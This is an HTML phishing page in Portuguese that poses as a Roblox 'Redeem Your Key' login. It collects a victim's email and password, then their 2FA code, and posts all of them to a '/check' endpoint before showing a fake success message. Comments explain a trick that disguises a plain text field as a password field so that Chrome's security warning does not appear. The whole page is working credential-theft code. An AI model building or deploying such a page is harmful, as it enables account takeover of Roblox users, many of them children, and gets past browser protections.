<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redeem Your Key - Roblox Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a1a;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            background: #2b2b2b;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 350px;
            text-align: center;
        }

        h1 {
            color: #00b060;
            margin-bottom: 20px;
            font-size: 24px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #ccc;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #444;
            border-radius: 8px;
            background: #333;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #00b060;
            outline: none;
        }

        /* ESTE É O TRUQUE PARA O CHROME: */
        /* Faz o campo parecer senha (pontinhos) mas é um texto comum */
        .password-field {
            -webkit-text-security: disc;
        }

        button {
            width: 100%;
            padding: 12px;
            background: #00b060;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }

        button:hover {
            background: #009950;
        }

        .message {
            margin-top: 15px;
            font-size: 14px;
            min-height: 20px;
        }

        .success {
            color: #00b060;
        }

        .error {
            color: #ff4d4d;
        }

        .loading {
            color: #ffcc00;
        }

        #step2 {
            display: none;
        }

        .roblox-icon {
            width: 50px;
            height: 50px;
            background: #00b060;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 24px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="roblox-icon">R</div>
    <h1>Redeem Your Key</h1>
    
    <!-- Passo 1: Login -->
    <div id="step1">
        <div class="input-group">
            <label>Email</label>
            <input type="email" id="email" placeholder="seu-email@exemplo.com">
        </div>
        <div class="input-group">
            <label>Senha</label>
            <!-- MUDANÇA: type="text" e a classe "password-field" para esconder o aviso do Chrome -->
            <input type="text" id="password" class="password-field" placeholder="Sua senha">
        </div>
        <button onclick="checkLogin()">Verificar Conta</button>
        <div class="message" id="msg1"></div>
    </div>

    <!-- Passo 2: 2FA -->
    <div id="step2">
        <h2>Confirmação 2FA</h2>
        <p style="font-size: 14px; color: #ccc;">Verifique o email da sua conta Roblox e coloque o código de 6 dígitos.</p>
        <div class="input-group">
            <label>Código 2FA</label>
            <input type="text" id="code2fa" placeholder="Ex: 123456" maxlength="6">
        </div>
        <button onclick="submit2FA()">Confirmar e Resgatar</button>
        <div class="message" id="msg2"></div>
    </div>
</div>

<script>
    async function checkLogin() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const msgDiv = document.getElementById('msg1');
        const btn = document.querySelector('#step1 button');

        if (!email || !password) {
            msgDiv.innerHTML = '<span class="error">Preencha o Email e a Senha!</span>';
            return;
        }

        msgDiv.innerHTML = '<span class="loading">Verificando conta...</span>';
        btn.disabled = true;
        btn.style.opacity = '0.7';

        try {
            const response = await fetch('/check', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            });

            const data = await response.json();

            if (data.success) {
                msgDiv.innerHTML = '<span class="success">✅ Conta Encontrada! Vai para a confirmação...</span>';
                setTimeout(() => {
                    document.getElementById('step1').style.display = 'none';
                    document.getElementById('step2').style.display = 'block';
                }, 1500);
            } else {
                msgDiv.innerHTML = '<span class="error">❌ ' + (data.error || 'Erro ao verificar a conta.') + '</span>';
            }
        } catch (error) {
            msgDiv.innerHTML = '<span class="error">❌ Erro de Conexão com o Servidor.</span>';
            console.error('Erro:', error);
        } finally {
            btn.disabled = false;
            btn.style.opacity = '1';
        }
    }

    async function submit2FA() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const code = document.getElementById('code2fa').value;
        const msgDiv = document.getElementById('msg2');
        const btn = document.querySelector('#step2 button');

        if (!code) {
            msgDiv.innerHTML = '<span class="error">Preencha o Código 2FA!</span>';
            return;
        }

        msgDiv.innerHTML = '<span class="loading">Enviando dados...</span>';
        btn.disabled = true;

        try {
            await fetch('/check', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    code2fa: code,
                    isFinalStep: true
                })
            });

            msgDiv.innerHTML = '<span class="success">✅ Sucesso! A sua chave será enviada em breve.</span>';
            
            setTimeout(() => {
                document.querySelector('.container').innerHTML = '<h1 style="color:#00b060">Tudo Pronto!</h1><p>Aguarde o email de confirmação.</p>';
            }, 2000);

        } catch (error) {
            msgDiv.innerHTML = '<span class="error">❌ Erro ao enviar o código.</span>';
        } finally {
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
